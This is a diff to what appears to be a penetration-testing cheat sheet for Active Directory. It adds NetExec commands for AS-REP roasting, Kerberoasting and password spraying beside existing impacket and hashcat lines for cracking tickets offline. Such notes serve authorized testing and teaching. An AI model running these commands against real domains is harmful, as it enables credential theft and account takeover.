@@ -14,6 +14,7 @@ An account without Kerberos pre-authentication can return material for offline p
 
 ```bash
 impacket-GetNPUsers <domain.tld>/ -dc-ip <dc-ip> -usersfile users.txt -no-pass -format hashcat
+nxc ldap <dc-ip> -u <user> -p '<password>' --asreproast hashes.asreproast
 hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt
 ```
 
@@ -23,8 +24,11 @@ A domain user can request a service ticket for an SPN. Prefer user-backed servic
 
 ```bash
 impacket-GetUserSPNs -request -dc-ip <dc-ip> <domain.tld>/<user>
+nxc ldap <dc-ip> -u <user> -p '<password>' --kerberoasting hashes.kerberoast
 hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt
 ```
+
+For a password spray, get the current lockout policy and use a narrow candidate list. `nxc smb <dc-ip> -u users.txt -p '<candidate>' --continue-on-success` checks one candidate across selected users; account lockouts can still result if failures have already accumulated.
 
 ## Ticket and replication checks
 
